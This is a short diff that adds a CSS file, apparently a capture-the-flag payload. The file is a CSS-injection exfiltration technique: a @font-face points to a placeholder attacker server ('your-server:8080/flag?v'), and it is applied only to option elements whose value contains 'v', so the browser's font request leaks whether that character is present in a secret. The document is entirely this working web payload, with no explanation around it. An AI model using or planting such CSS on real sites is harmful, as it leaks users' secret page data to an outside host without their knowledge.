@@ -1,0 +1,9 @@
+@charset "UTF-8";
+
+@font-face {
+    font-family: "flag-v";
+    src: url("http://your-server:8080/flag?v");
+}
+option[value*="v"] {
+    font-family: "flag-v";
+}
